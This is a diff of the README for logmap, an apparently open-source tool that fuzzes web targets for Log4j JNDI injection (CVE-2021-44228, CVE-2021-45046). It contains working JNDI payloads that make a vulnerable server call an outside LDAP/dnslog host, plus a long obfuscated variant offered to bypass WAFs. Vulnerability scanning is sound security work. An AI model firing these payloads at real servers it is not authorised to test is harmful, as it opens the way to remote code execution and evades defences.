@@ -1,14 +1,17 @@
-# logmap - Log4j2 jndi injection fuzz tool
+# logmap 0.4 - Log4j jndi injection fuzz tool
 
 Used for fuzzing to test whether there are log4j2 jndi injection vulnerabilities in header/body/path  
 Use https://log.xn--9tr.com dnslog by default, If you want to use http://ceye.io, you need to modify the domain and token  
-Manually edit line [#429](https://github.com/zhzyker/logmap/blob/main/logmap.py#L429) in logmap.py to modify:  
+Manually edit line [#463](https://github.com/zhzyker/logmap/blob/main/logmap.py#L429) in logmap.py to modify:  
 `args.ceye = ["xxxxxx.ceye.io", "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"]`  
 to   
 `args.ceye = ["1234567.ceye.io", "843fd6d58a8ebede756a2b991d321a5a"]`  
 
-The default payload is `${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//DOMAIN/xxxxxx}` Use `-w` or `-waf` to obfuscate the payload to bypass waf, it looks like:  
+The default payload is `${{jndi:ldap://you-domain/path}}` Use `-w` or `-waf` to obfuscate the payload to bypass waf, it looks like:  
  `${${zod:as:-j}ndi:ldap:${MOH7P:-/}/${jUqr1:dlhUT:zX:Mu:rXx:-9}b71${6r3c:E8ExQh:a:iqML:-a}${jLR:s6xE:-7}${j:zzb:-3}d8${f:CF:DpXSA:-0}${7:2:yM:LnbSk:-1}c3199${4tPUvE:fj7:6K:xpqPQc:rCnYQB:-1}${G:Q:SET9R:u:9t0cc1:-1}${cLF:kENZON:e:p6f:-9}${y:i:abgu0:2cb:-3}6${35aUvK:40sxe:PaVK:cR:-d}${ysVe:byc:e:5nvP:9yVRko:-3}${Cm:DLU:-c}3f0b${iiuZKY:taWD:-4}${B:VK3:3BWv:L:-4}${KA6:GX:xxVWZg:-3}5.${6E50:-f}${iNN4:Ol:XLrqD:-3}${3Fh:T6:-6}e4${IAyoy:-d}${hMZgt:bmBCp9:bY6ofD:KR:-e}${6Ny3E:-b}.${K:Q:-d}n${FLlWGk:-s}.14${8M:-3}${W0u:LA5Z:N:-3}${t5FH:-.}e${GL:x0L72g:bqf9:6:pRQp:-u}${VIq:V:-.}${r:zFcvb:7hqmx:HTGO8:-o}r${n1ZHSo:w:-g}./Efti${Q3:-G}1}`   
+Bypass reference: [StringObfuscator2.java](https://github.com/woodpecker-appstore/log4j-payload-generator/blob/master/src/main/java/me/gv7/woodpekcer/vuldb/StringObfuscator2.java) by https://github.com/c0ny1
+
+Use `-c 1` or `--cve 1` to specify the payload, support: [1:CVE-2021-44228, 2:CVE-2021-45046]  
 
 This is just a jndi injection fuzz tool, rce or others need yourself  
 
@@ -25,9 +28,11 @@ zhzy@debian:~/$ python3 logmap.py -h
 ```bash
   -u URL, --url URL     Target URL (e.g. http://example.com )
   -f FILE, --file FILE  Select a target list file (e.g. list.txt )
+  -c 1, --cve 1         CVE [1:CVE-2021-44228, 2:CVE-2021-45046] default 1
   -d 1, --dns 1         Dnslog [1:log.xn--9tr.com, 2:ceye.io] default 1
   -p PAYLOAD            Custom payload (e.g. ${jndi:ldap://xx.dns.xx/} )
   -t 10                 Http timeout default 10s
+  -o file               Output file
   -w, --waf             Obfuscate the payload and bypass waf
   --proxy PROXY         Proxy [socks5/socks4/http] (e.g. http://127.0.0.1:8080)
   -h, --help            Show this help message and exit
